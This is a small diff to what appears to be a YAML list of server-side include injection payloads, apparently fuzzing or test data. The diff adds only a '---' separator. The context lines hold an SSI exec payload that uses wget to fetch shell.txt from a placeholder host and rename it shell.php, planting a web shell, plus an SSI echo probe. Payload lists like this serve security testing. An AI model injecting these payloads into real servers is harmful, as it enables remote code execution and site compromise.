@@ -1,3 +1,4 @@
+---
 payload:
   - '<!--#exec cmd="wget http://some_host/shell.txt | rename shell.txt shell.php"-->'
   - '<!--#echo var="DOCUMENT_URI" -->'
